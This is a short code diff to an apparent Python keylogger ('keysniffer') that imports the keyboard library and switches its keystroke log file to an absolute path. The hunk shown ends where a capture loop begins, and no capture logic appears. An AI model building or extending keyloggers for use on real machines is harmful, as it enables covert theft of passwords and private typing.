@@ -2,9 +2,12 @@
 
 
 import keyboard
+import os
+
 
 # Defining the text file name and path
-path = "keysniffer_data.txt"
+path = os.path.abspath("keysniffer_data.txt")
+
 
 try:
     while True:
